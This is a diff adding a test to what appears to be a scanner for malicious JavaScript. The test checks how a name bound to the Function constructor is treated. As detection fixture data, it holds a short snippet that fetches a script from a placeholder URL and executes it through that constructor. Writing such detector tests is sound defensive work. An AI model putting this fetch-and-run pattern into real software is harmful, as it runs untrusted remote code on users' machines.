@@ -188,6 +188,22 @@ def test_indirect_sink_alone_is_the_capability_only(tmp_path):
         assert report.risk_score == 0 and report.verdict["has_malicious_indicators"] is False
 
 
+def test_a_name_bound_to_the_function_constructor_is_a_sink_only_for_a_response(tmp_path):
+    # `const F = Function` is how a schema compiler reaches the constructor, often only to probe
+    # it with an empty body: on its own it adds nothing to the capability finding.
+    probe = 'const F = Function;\nfunction allowed() {\n  try { new F(""); return true; }'
+    probe += ' catch (_) { return false; }\n}\n'
+    alone = tmp_path / "alone"
+    alone.mkdir()
+    assert R_DYN not in _ids(alone, probe)
+    fetched = tmp_path / "fetched"
+    fetched.mkdir()
+    ids = _ids(fetched, 'const F = Function;\nasync function go() {\n'
+                        f'  const body = await (await fetch("{URL}.js")).text();\n'
+                        '  return new F(body)();\n}\n')
+    assert R_NODE in ids
+
+
 def test_indexing_the_global_object_by_an_ordinary_name_is_not_a_sink(tmp_path):
     f = _file(tmp_path, 'const k = "setTimeout";\nglobalThis[k](() => {}, 10);\n'
                         'const handlers = {};\nwindow[name](1);\n')
